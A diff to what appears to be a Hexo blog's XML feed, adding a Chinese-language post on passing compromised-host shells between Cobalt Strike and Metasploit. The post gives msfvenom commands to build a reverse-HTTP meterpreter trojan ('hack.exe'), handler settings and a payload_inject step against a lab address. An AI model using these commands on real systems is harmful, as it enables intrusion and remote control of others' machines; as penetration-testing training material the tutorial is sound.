@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>cs与msf互传shell</title>
+      <link href="/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/"/>
+      <url>/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/</url>
+      
+        <content type="html"><![CDATA[<p>在shell模式下，输入chcp 65001可以解决乱码</p><h2 id="cs传shell给msf"><a href="#cs传shell给msf" class="headerlink" title="cs传shell给msf"></a>cs传shell给msf</h2><p> 首先就是正常的靶机上线cs</p><p><img src="/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/image-20230804103329419.png" alt="image-20230804103329419"></p><p>然后生成一个foreign的监听器</p><p><img src="/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/image-20230804103634433.png" alt="image-20230804103634433"></p><p>在msf上设置监听</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_http set lhost 192.168.111.128set lport 6666run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/image-20230804104015994.png" alt="image-20230804104015994"></p><p>选择刚刚新建的msf监听器</p><p>msf已经接收到shell</p><p><img src="/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/image-20230804104723403.png" alt="image-20230804104723403"></p><h2 id="msf传shell给cs"><a href="#msf传shell给cs" class="headerlink" title="msf传shell给cs"></a>msf传shell给cs</h2><p>首先先是msf获得shell</p><p>先生成对应的木马，设置对应的监听，把木马上传到目标机器并且执行，msf就获得了shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/reverse_http <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.111.128 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">5555</span> <span class="token parameter variable">-f</span> exe <span class="token operator">></span> hack.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/image-20230804120834033.png" alt="image-20230804120834033"></p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_httpset lhost 192.168.111.128set lport 5555run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/image-20230804120808246.png" alt="image-20230804120808246"></p><p>cs上设置监听</p><p><img src="/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/image-20230804123026729.png" alt="image-20230804123026729"></p><p>拿到meterpreter之后先background</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;payload_injectset payload windows&#x2F;meterpreter&#x2F;reverse_httpset lhost 192.168.111.128set lport 7777set session 3set disablepayloadhandler trueexploit -j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/image-20230804122955587.png" alt="image-20230804122955587"></p><p>再回到cs，发现主机就已经上线了</p><p><img src="/2023/08/04/ms%E4%B8%8Emsf%E4%BA%92%E4%BC%A0shell/image-20230804123103907.png" alt="image-20230804123103907"></p><p>msf和cs的shell互不影响</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> cs和msf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> cs与msf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>内网渗透中常见名词</title>
       <link href="/2023/08/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/"/>
       <url>/2023/08/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/</url>
